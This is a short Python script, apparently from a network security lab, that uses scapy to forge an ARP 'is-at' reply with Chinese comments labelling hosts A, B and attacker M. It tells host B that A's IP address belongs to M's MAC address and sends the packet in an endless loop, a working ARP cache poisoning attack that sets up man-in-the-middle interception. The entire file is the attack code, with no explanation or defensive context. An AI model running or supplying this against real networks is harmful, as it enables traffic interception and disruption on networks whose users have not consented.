#!/usr/bin/python3
from scapy.all import *
E = Ether()
A = ARP(
    op= "is-at",
    # 毒化记录中的MAC,即M的MAC地址
    hwsrc = "d0:c5:d3:03:1d:fd",
    # 发送方IP地址/毒化记录中的IP，A的IP地址
    psrc = "192.168.43.8",

    # 目标Mac地址/被欺骗主机MAC，B的MAC地址
    hwdst="00:0c:29:2b:f9:df",
    # 目标IP地址/被欺骗主机IP地址，B的IP地址
    pdst="192.168.43.49"
)
pkt = E/A
print(pkt.show())
while (1):
    sendp(pkt)


